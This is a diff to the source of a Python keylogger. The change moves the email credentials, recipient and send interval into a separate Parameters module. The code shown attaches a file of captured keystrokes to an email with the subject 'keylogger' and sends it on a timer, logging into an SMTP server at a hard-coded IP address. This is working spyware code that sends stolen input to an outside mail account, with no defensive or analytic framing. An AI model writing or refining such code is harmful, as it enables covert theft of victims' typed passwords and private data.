@@ -4,10 +4,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 import time
 from threading import Thread
+import Parameters
 
-MailDirection = ""
-MailPasword = ""
-Mailaddressee = ""
 
 def PressKey(key):
     print(key)
@@ -31,8 +29,8 @@ def SendInput():
     subject = "keylogger"
 
     message = MIMEMultipart("plain")
-    message["From"] = MailDirection
-    message["To"] = Mailaddressee
+    message["From"] = Parameters.MailDirection
+    message["To"] = Parameters.Mailaddressee
     message["Subject"] = subject
     Adjunt = MIMEBase("application", "octect-stream")
     Adjunt.set_payload(open("mail.txt", "rb").read())
@@ -40,8 +38,8 @@ def SendInput():
 
     server = smtp.SMTP('64.233.184.108')
     server.starttls()
-    server.login(MailDirection, MailPasword)
-    server.sendmail(MailDirection, Mailaddressee, message.as_string())
+    server.login(Parameters.MailDirection, Parameters.MailPasword)
+    server.sendmail(Parameters.MailDirection, Parameters.Mailaddressee, message.as_string())
 
     print("The Mail Has Been Send")
 
@@ -54,7 +52,7 @@ def CounterAndSend():
 
         ClearFile()
 
-        time.sleep(10)
+        time.sleep(Parameters.Time)
 
         SendInput()
 
